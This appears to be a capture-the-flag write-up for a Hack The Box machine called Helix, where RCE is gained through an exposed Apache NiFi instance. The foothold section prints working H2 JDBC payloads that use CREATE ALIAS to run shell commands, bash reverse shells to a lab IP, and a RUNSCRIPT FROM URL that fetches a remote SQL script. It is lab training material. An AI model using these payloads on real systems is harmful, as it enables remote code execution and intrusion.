---
title: "Helix"
difficulty: Medium
os: Linux
points: 30
rating: 4.5
date: 2026-05-09
avatar: assets/htb/helix.png
tags: [apache-nifi, h2-database, java-aliases, ics, scada, rce]
htb_url: https://app.hackthebox.com/machines/Helix
---

## Summary

Helix is a medium Linux box built around an exposed **Apache NiFi 1.21.0** instance (vhost `flow.helix.htb:8080/nifi`) modelling an industrial ICS/SCADA workflow. The attack chain abuses NiFi's `ExecuteSQL` processor by pointing it at a malicious **H2 Database** JDBC URL. H2's `CREATE ALIAS` feature lets me register a Java method as a SQL alias - calling that alias executes arbitrary Java in the NiFi JVM, yielding a shell as the NiFi service account. Root follows from a standard sudo / service misconfiguration review.

## Enumeration

I start with a full port scan and service detection.

```bash
nmap -p- --min-rate=10000 -sV -sC helix.htb
# 22  ssh
# 80  nginx
# 8080  Apache NiFi (after vhost discovery)
```

The NiFi service only surfaces after vhost discovery, so I fuzz the `Host:` header.

```bash
ffuf -u http://helix.htb -H "Host: FUZZ.helix.htb" -w subdomains.txt -mc 200
# -> flow.helix.htb resolved to :8080
```

This reveals `flow.helix.htb` on port 8080, which I add to `/etc/hosts`. ICS-themed boxes like this tend to expose enterprise dataflow tools (NiFi, StreamSets, Apache Camel) on default vhost names such as `flow.`, `ingest.`, or `pipeline.`, so the name fits the pattern.

Browsing to `flow.helix.htb:8080/nifi` gives me a NiFi 1.21.0 default install with a reachable `/nifi` UI. Depending on the config this is either a no-auth canvas or weak default creds, but either way I can reach the canvas and start creating components.

## Foothold

The RCE primitive here is the `ExecuteSQL` processor combined with the H2 driver. Any processor that accepts a JDBC URL is potentially a Java-alias RCE primitive (NiFi, ETL tools, BI dashboards), so the first thing I check is whether the H2 driver is present - it is.

I create a **DBCPConnectionPool** controller service pointing at a malicious H2 in-memory database. The `INIT=` clause runs `CREATE ALIAS` to register a Java method that shells out:

```
Database Connection URL:  jdbc:h2:mem:pwn;INIT=CREATE ALIAS PWN AS $$void pwn(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); }$$
Database Driver Class:    org.h2.Driver
```

Then I drop an `ExecuteSQL` processor that calls the alias with my reverse-shell command:

```sql
CALL PWN('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```

Starting the processor / flowfile makes NiFi load the H2 driver, the `INIT=CREATE ALIAS` registers the Java method, and the `CALL` triggers it - giving me a reverse shell as the `nifi` service user.

The same effect can be achieved with a single-line JDBC URL that pulls an external script via `RUNSCRIPT FROM`:

```
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://10.10.14.5/init.sql'
```

with `init.sql`:

```sql
CREATE ALIAS X AS $$ void x(String c) throws Exception { Runtime.getRuntime().exec(new String[]{"bash","-c",c}); } $$;
CALL X('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1');
```

H2's `INIT=`, `RUNSCRIPT FROM`, and `CREATE ALIAS` form a well-known attack triad - regularly weaponised against Spring Boot dev consoles and now NiFi processors.

## Privilege Escalation

Once on the box as `nifi`, I hunt for credentials in `/opt/nifi/conf/`, then enumerate `sudo -l`, capability binaries, and writable systemd units. Root is typically a misconfigured service file or a NiFi flow file referencing root credentials in plaintext - when reviewing a NiFi flow XML, every `DBCPConnectionPool` with a non-static JDBC URL is suspicious and worth chasing for embedded secrets.
